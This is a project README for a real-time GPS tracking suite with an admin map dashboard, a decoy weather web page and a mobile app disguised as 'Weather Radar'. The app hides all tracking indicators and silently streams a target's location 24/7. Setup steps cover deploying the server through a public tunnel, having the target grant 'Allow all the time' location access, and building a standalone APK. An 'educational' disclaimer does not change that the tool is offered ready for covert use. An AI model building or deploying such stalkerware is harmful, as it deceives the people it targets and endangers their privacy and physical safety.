# Live Location Tracker & Weather Radar Suite

**Created by srishanbangera** • [GitHub Repository](https://github.com/srishanbangera-sys/Live-location-tracker.git)

> **Short Description:**
> A full-stack, real-time continuous GPS location tracking suite featuring an Express & Socket.IO admin map dashboard, a modern Web decoy interface, and a stealth React Native mobile application disguised as a Weather Radar. Built for educational demonstrations, live telemetry visualization, and security testing.

---

## 🌟 Key Features

- **🌐 Live Admin Dashboard (`/`)**:
  - Interactive Leaflet & OpenStreetMap visualization with glowing target pins.
  - Dynamic **Movement Polyline Trails** displaying the target's exact continuous path.
  - Low-latency real-time telemetry (coordinates, ping timestamps, update counters).
  - Protected cookie-based admin authentication (`admin` / `admin`).

- **🌤️ Decoy Web Weather App (`/weather`)**:
  - Sleek glassmorphism UI with local temperature, humidity, wind, and UV metrics.
  - **`watchPosition` Hardware Listener**: Streams continuous GPS updates directly from device hardware.
  - **Screen Wake Lock & Silent Audio Keep-Alive**: Prevents mobile browser event loops from freezing when backgrounded.

- **📱 Stealth Native Mobile Application (`/mobile-app`)**:
  - Built with **Expo SDK 54**, **React Native**, `expo-location`, and `expo-task-manager`.
  - Disguised completely as **"Weather Radar"** with authentic weather forecasts and zero visible tracking indicators.
  - **24/7 Background OS Kernel Task**: Android Foreground Service streams location 24/7 even when the app interface is closed.
  - Hidden Server Configuration modal accessed via top-right ⚙️ icon.

---

## 🚀 Quick Start Guide

### 1. Start the Backend Server

```bash
# Clone the repository
git clone https://github.com/srishanbangera-sys/Live-location-tracker.git
cd Live-location-tracker

# Install dependencies
npm install

# Run the server
npm start
```

Once launched, the terminal will display:
- **Local Dashboard**: `http://localhost:6589`
- **Remote Cloudflare Tunnel**: `https://<random-id>.trycloudflare.com`

---

### 2. Access the Admin Dashboard
1. Open **`http://localhost:6589`** in your browser.
2. Login with credentials:
   - **Username**: `admin`
   - **Password**: `admin`
3. Click on any target ID to view their **Live Map & Movement Trajectory Trail**.

---

### 3. Deploying the Mobile App (`mobile-app/`)

```bash
# Navigate to mobile app directory
cd mobile-app

# Install Expo dependencies
npm install

# Start Expo bundler
npx expo start
```

1. Open **Expo Go** on your physical Android or iOS device.
2. Scan the terminal QR code to open **Weather Radar**.
3. Grant location permissions when prompted (*"Allow all the time"* on Android).
4. Coordinates will silently stream 24/7 to your Admin Dashboard!

#### Building Standalone Android APK:
```bash
cd mobile-app
npx eas build --platform android --profile preview
```

---

## 📁 Repository Structure

```text
Live-location-tracker/
├── config.js              # Server port and admin credentials configuration
├── server.js              # Node.js + Socket.IO + Cloudflare Tunnel server
├── router.js              # API routes & in-memory target trajectory store
├── views/
│   ├── home.html          # Admin dashboard page
│   ├── map.html           # Live Leaflet map with polyline trajectory trails
│   ├── login.html         # Admin login page
│   └── weather.html       # Web decoy weather app interface
└── mobile-app/            # React Native Expo (SDK 54) native mobile app
    ├── App.js             # Stealth Weather Radar UI & 24/7 background task
    ├── app.json           # Expo SDK 54 permissions & app metadata
    ├── babel.config.js    # Babel Expo preset configuration
    └── metro.config.js    # Metro transformer configuration
```

---

## 🔒 License & Disclaimer
This software is created for educational purposes, seminars, and authorized security demonstrations.
